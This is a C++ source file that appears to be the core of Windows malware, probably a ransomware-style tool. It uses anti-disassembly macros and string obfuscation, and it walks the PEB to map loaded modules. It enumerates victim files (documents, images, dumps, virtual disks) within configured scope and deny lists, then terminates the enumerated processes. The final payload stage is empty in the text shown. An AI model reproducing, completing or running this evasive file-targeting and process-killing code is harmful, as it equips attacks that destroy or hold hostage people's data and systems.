#include "7layers.h"
#include "filesys.h"
#include "procsys.h"
#include "debug.h"
#include "obfuscation.h"
#include "csymbol.h"

constexpr uint64_t KB = 1024ULL;
constexpr uint64_t MB = KB * 1024ULL;
constexpr uint64_t GB = MB * 1024ULL;
constexpr uint64_t TB = GB * 1024ULL;

static int check_conflict_ext_scope() {
    ANTI_DISASM();
    size_t size_scope_ext   = (size_t)ARRAYSIZE(SCOPE_EXT_LIST);
    size_t size_deny_ext    = (size_t)ARRAYSIZE(HARD_DENY_EXT);

    for (int i=0; i < (int)size_deny_ext; i++) {
        for (int j=0; j < (int)size_scope_ext; j++) {
            if (c_strcmp(HARD_DENY_EXT[i].extension, SCOPE_EXT_LIST[j].extension) == 0) {
                WARN("Conflict on HARD_DENY_EXT:\t%s", HARD_DENY_EXT[i].extension);
                return -1;
            }
        }
    }
    return 0;
}

static int check_conflict_path_scope() {
    auto normalize = [](const char* raw, std::filesystem::path& result) -> bool {
        if (!raw || !*raw)
            return false;

        int n = MultiByteToWideChar(
            CP_UTF8, MB_ERR_INVALID_CHARS,
            raw, -1, nullptr, 0
        );

        if (n <= 0)
            return false;

        std::wstring source(n, L'\0');

        if (!MultiByteToWideChar(
                CP_UTF8, MB_ERR_INVALID_CHARS,
                raw, -1, source.data(), n))
            return false;

        DWORD required = ExpandEnvironmentStringsW(
            source.c_str(), nullptr, 0
        );

        if (!required)
            return false;

        std::wstring expanded(required, L'\0');

        DWORD written = ExpandEnvironmentStringsW(
            source.c_str(), expanded.data(), required
        );

        if (!written || written > required)
            return false;

        expanded.resize(written - 1);

        result = std::filesystem::path(expanded).lexically_normal();

        if (result.empty() || !result.is_absolute())
            return false;

        if (!result.has_filename() && result != result.root_path())
            result = result.parent_path();

        return true;
    };

    auto overlaps = [](const std::filesystem::path& a, const std::filesystem::path& b) -> bool {
        auto x = a.begin();
        auto y = b.begin();

        while (x != a.end() && y != b.end()) {
            const std::wstring lhs = x->wstring();
            const std::wstring rhs = y->wstring();

            if (CompareStringOrdinal(
                    lhs.c_str(), static_cast<int>(lhs.size()),
                    rhs.c_str(), static_cast<int>(rhs.size()),
                    TRUE
                ) != CSTR_EQUAL)
                return false;

            ++x;
            ++y;
        }

        return x == a.end() || y == b.end();
    };

    std::vector<std::filesystem::path> scopes;
    std::vector<std::filesystem::path> denies;

    for (const auto& entry : SCOPE_PATH_LIST) {
        std::filesystem::path path;

        if (!normalize(entry.path, path)) {
            WARN("Invalid scope path: %s", entry.path);
            return -1;
        }

        scopes.emplace_back(std::move(path));
    }

    for (const auto& entry : HARD_DENY_PATH) {
        std::filesystem::path path;

        if (!normalize(entry.path, path)) {
            WARN("Invalid deny path: %s", entry.path);
            return -1;
        }

        denies.emplace_back(std::move(path));
    }

    for (size_t i = 0; i < scopes.size(); ++i) {
        for (size_t j = 0; j < denies.size(); ++j) {
            if (overlaps(scopes[i], denies[j])) {
                WARN("Conflict on HARD_DENY_PATH: %s <-> %s", SCOPE_PATH_LIST[i].path, HARD_DENY_PATH[j].path
                );
                return -1;
            }
        }
    }

    for (size_t i = 0; i < scopes.size(); ++i) {
        for (size_t j = i + 1; j < scopes.size(); ++j) {
            if (overlaps(scopes[i], scopes[j])) {
                WARN("Conflict on SCOPE_EXT_LIST: %s <-> %s", SCOPE_PATH_LIST[i].path, SCOPE_PATH_LIST[j].path);
                return -1;
            }
        }
    }

    return 0;
}

static int check_conflict_proc_scope() {
    ANTI_DISASM();
    size_t size_scope_proc  = (size_t)ARRAYSIZE(SCOPE_PROC_LIST);
    size_t size_deny_proc   = (size_t)ARRAYSIZE(HARD_DENY_PROC);

    for (int i=0; i < (int)size_deny_proc; i++) {
        for (int j=0; j < (int)size_scope_proc; j++) {
            if (c_strcmp(HARD_DENY_PROC[i].name, SCOPE_PROC_LIST[j].name) == 0) {
                WARN("Conflict on HARD_DENY_PROC:\t%s", HARD_DENY_PROC[i].name);
                return -1;
            }
        }
    }
    return 0;
}

static int print_pretty_files(std::vector<FILE_ENTRY>* files) {
    constexpr uint64_t KB = 1024ULL;
    constexpr uint64_t MB = KB * 1024ULL;
    constexpr uint64_t GB = MB * 1024ULL;
    constexpr uint64_t TB = GB * 1024ULL;

    constexpr size_t MAX_NAME_LENGTH = 45;

    auto truncate_filename = [](const std::string& filename, size_t max_length) -> std::string {
        if (filename.size() <= max_length) {
            return filename;
        }

        if (max_length <= 4) {
            return filename.substr(0, max_length);
        }

        const std::string extension = std::filesystem::path(filename).extension().string();

        if (extension.size() > max_length - 5) {
            return filename.substr(0, 1) + "..." +
                   filename.substr(filename.size() - (max_length - 4));
        }

        const std::string stem = filename.substr(0, filename.size() - extension.size());

        const size_t available = max_length - extension.size() - 3;
        const size_t suffix_length = std::max<size_t>(1, available / 4);
        const size_t prefix_length = available - suffix_length;

        return stem.substr(0, prefix_length) + "..." +
               stem.substr(stem.size() - suffix_length) +
               extension;
    };

    for (const auto& file_entry : *files) {
        std::string type_name;

        switch (file_entry.type) {
            case DOCUMENT: type_name = OBF("DOCUMENT"); break;
            case IMAGE:    type_name = OBF("IMAGE");    break;
            case VIDEO:    type_name = OBF("VIDEO");    break;
            case AUDIO:    type_name = OBF("AUDIO");    break;
            case TEXT:     type_name = OBF("TEXT");     break;
            case GENERAL:  type_name = OBF("GENERAL");  break;
            case BINARY:   type_name = OBF("BINARY");   break;
            case DUMMY:    type_name = OBF("DUMMY");    break;
            case SCRIPT:   type_name = OBF("SCRIPT");   break;
            case DUMP:     type_name = OBF("DUMP");     break;
            case VDISK:    type_name = OBF("VDISK");    break;
            default:       type_name = OBF("UNKNOWN");  break;
        }

        std::string file_name = std::filesystem::path(file_entry.path).filename().string();

        file_name = truncate_filename(file_name, MAX_NAME_LENGTH);

        std::string size_str;
        const uint64_t size = file_entry.size;

        if (size < KB) {
            size_str = std::to_string(size) + "  B";
        } else if (size < MB) {
            size_str = std::to_string(size / KB) + " KB";
        } else if (size < GB) {
            size_str = std::to_string(size / MB) + " MB";
        } else if (size < TB) {
            size_str = std::to_string(size / GB) + " GB";
        } else {
            size_str = std::to_string(size / TB) + " TB";
        }

        INFO("%-10s | %-45s | %10s",
            type_name.c_str(),
            file_name.c_str(),
            size_str.c_str()
        );
    }

    return 0;
}

static int print_pretty_processes(std::vector<PROC_ENTRY>* processes) {
    if (!processes) return -1;

    constexpr size_t MAX_NAME_LENGTH = 45;

    auto truncate_name = [](const std::wstring& name, size_t max_length) -> std::wstring {
        if (name.size() <= max_length) {
            return name;
        }

        if (max_length <= 3) {
            return name.substr(0, max_length);
        }

        const size_t available = max_length - 3;
        const size_t suffix_length = available / 4;
        const size_t prefix_length = available - suffix_length;

        return name.substr(0, prefix_length) +
               L"..." +
               name.substr(name.size() - suffix_length);
    };

    auto wide_to_utf8 = [](const std::wstring& str) -> std::string {
        if (str.empty()) return {};

        const int size = WideCharToMultiByte(
            CP_UTF8,
            0,
            str.data(),
            static_cast<int>(str.size()),
            nullptr,
            0,
            nullptr,
            nullptr
        );

        if (size <= 0) return {};

        std::string result(size, '\0');

        if (!WideCharToMultiByte(
            CP_UTF8,
            0,
            str.data(),
            static_cast<int>(str.size()),
            result.data(),
            size,
            nullptr,
            nullptr
        )) {
            return {};
        }

        return result;
    };

    for (const auto& proc : *processes) {
        std::wstring truncated_name = truncate_name(proc.name,MAX_NAME_LENGTH);

        std::string name = wide_to_utf8(truncated_name);

        if (name.empty()) {
            name = OBF("N/A");
        }
        INFO("PID: %-5u | %-45s | PPID: %4u",
            static_cast<unsigned long>(proc.pid),
            name.c_str(),
            static_cast<unsigned long>(proc.ppid)
        );
    }

    return 0;
}

static int build_memory_context(std::vector<MEM_CTX>* ctx) {
    if (!ctx) {
        FAIL("Invalid MEM_CTX vector.");
        return 0;
    }

    ctx->clear();

    auto* peb = GetPEB();
    if (!peb || !peb->Ldr) {
        FAIL("Invalid PEB/PEB_LDR_DATA.");
        return 0;
    }

    auto* ldr = reinterpret_cast<CPEB_LDR_DATA*>(peb->Ldr);

    LIST_ENTRY* ldr_head = &ldr->InLoadOrderModuleList;
    LIST_ENTRY* ldr_curr = ldr_head->Flink;

    while (ldr_curr && ldr_curr != ldr_head) {
        auto* ldr_data = reinterpret_cast<CLDR_DATA_TABLE_ENTRY*>(ldr_curr);

        LIST_ENTRY* next = ldr_curr->Flink;
        ldr_curr = next;

        std::array<char, MAX_PATH> name{};

        if (!ldr_data->BaseDllName.Buffer) {
            continue;
        }

        const size_t len = c_wchar_to_char(
            ldr_data->BaseDllName.Buffer,
            ldr_data->BaseDllName.Length / sizeof(WCHAR),
            name.data(),
            name.size() - 1
        );

        if (len == 0 || len >= name.size()) {
            WARN("Invalid char convert request");
            continue;
        }

        name[len] = '\0';

        void* base = ldr_data->DllBase;
        void* entry = ldr_data->EntryPoint;

        if (!base) {
            continue;
        }

        auto* image = static_cast<BYTE*>(base);
        auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(image);

        if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
            dos->e_lfanew <= 0) {
            WARN("Invalid PE header: %s", name.data());
            continue;
        }

        auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(
            image + dos->e_lfanew
        );

        if (nt->Signature != IMAGE_NT_SIGNATURE ||
            nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            WARN("Invalid NT header: %s", name.data());
            continue;
        }

        const bool isDLL = (nt->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0;
        const auto& directories = nt->OptionalHeader.DataDirectory;
        const DWORD import_rva = directories[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        const DWORD export_rva = directories[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

        IMAGE_IMPORT_DESCRIPTOR* import_dir = nullptr;
        IMAGE_EXPORT_DIRECTORY* export_dir = nullptr;

        if (import_rva != 0) {
            import_dir = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
                image + import_rva
            );
        }

        if (export_rva != 0) {
            export_dir = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
                image + export_rva
            );
        }

        MEM_CTX item{};

        item.name = name.data();
        item.base = base;
        item.entry = entry;
        item.image = image;
        item.isDLL = isDLL;
        item.dos = dos;
        item.nt = nt;
        item.import_dir = import_dir;
        item.export_dir = export_dir;

        ctx->emplace_back(std::move(item));

        INFO("Memory context loaded: %s", name.data());
    }

    return 1;
}

int main() {
    std::vector<MEM_CTX> mem_ctx;
    std::vector<FILE_ENTRY> files;
    std::vector<PROC_ENTRY> processes;

    // -------------------------------------------
    ANTI_DISASM();
    build_memory_context(&mem_ctx);

    DBUG("--------------------------------------------------------------------------------------");

    // -------------------------------------------
    ANTI_DISASM();

    int conflict_on_path = check_conflict_path_scope();
    int conflict_on_ext  = check_conflict_ext_scope();
    int conflict_on_proc = check_conflict_proc_scope();

    if (conflict_on_path != 0 || conflict_on_ext != 0 || conflict_on_proc != 0) {
        FAIL("Conflict detected in configuration");
        return -1;
    }

    // -------------------------------------------
    ANTI_DISASM();

    std::vector<std::string> resolved_paths;
    for (const auto& path_scope : SCOPE_PATH_LIST) {
        char resolved_path[MAX_PATH] = {0};
        DWORD len = ExpandEnvironmentStringsA(
            path_scope.path,
            resolved_path,
            MAX_PATH
        );

        if (len == 0 || len > MAX_PATH) {
            FAIL("Failed to resolve path: %s", path_scope.path);
            continue;
        }

        resolved_paths.emplace_back(resolved_path);
    }

    // -------------------------------------------
    ANTI_DISASM();

    for (std::string& path : resolved_paths) {
        if (!std::filesystem::exists(path)) {
            WARN("Path does not exist: %s", path.c_str());
            continue;
        }
        INFO("Found: %s", path.c_str());
    }

    DBUG("--------------------------------------------------------------------------------------");

    // -------------------------------------------
    ANTI_DISASM();

    for (std::size_t i=0; i < resolved_paths.size(); i++) {
        const auto& path = resolved_paths[(int)i];
        const auto& path_scope = SCOPE_PATH_LIST[(int)i];

        if (enumerate_files(&files, path, 0, path_scope.max_depth) != 0) {
            FAIL("Failed to enumerate files in: %s", path.c_str());
        }
    }

    print_pretty_files(&files);
    DBUG("--------------------------------------------------------------------------------------");

    // -------------------------------------------
    ANTI_DISASM();

    if (enumerate_processes(&processes) == 0) {
        print_pretty_processes(&processes);
        if (processes.size() != 0) { 
            DBUG("--------------------------------------------------------------------------------------");
        }
    }

    // -------------------------------------------
    ANTI_DISASM();

    for (PROC_ENTRY& proc_entry : processes) {
        const wchar_t *proc_name = proc_entry.name.c_str();
        DWORD pid = proc_entry.pid;
        int result = terminate_by_pid(pid);

        char name[100] = {};

        const size_t convert_size = c_wchar_to_char(
            proc_name,
            std::wcslen(proc_name),
            name,
            sizeof(name) - 1
        );

        if (convert_size == 0) {
            continue;
        }

        if (result == 0) {
            INFO("Process terminated: %s", name);
        }
        else if (result == -1) {
            FAIL("Process termination failed: %s", name);
        }
    }

    // -------------------------------------------
    ANTI_DISASM();

    

    // -------------------------------------------

    return 0;
}